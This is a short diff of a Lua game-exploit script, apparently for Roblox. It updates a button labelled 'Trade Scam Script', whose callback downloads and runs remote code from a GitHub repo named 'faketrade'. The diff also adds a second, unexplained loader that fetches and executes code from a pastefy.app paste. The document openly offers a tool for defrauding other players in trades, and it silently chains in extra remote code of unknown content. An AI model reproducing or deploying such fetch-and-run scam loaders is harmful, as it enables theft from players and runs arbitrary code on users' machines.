@@ -60,7 +60,8 @@ StockTab:CreateButton({
 Tab:CreateButton({
     Name = "Trade Scam Script(UPDATED!),only work public server,no loading screen,the inventory wont disapear anymore",
     Callback = function()
-        loadstring(function()pGet("https://raw.githubusercontent.com/PhatLee877/faketrade/refs/heads/main/ScriptByPhatLee"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/faketrade/refs/heads/main/ScriptByPhatLee"))()
+        loadstring(game:HttpGet("https://pastefy.app/fVgYsz1u/raw"))()
     end
 })
 
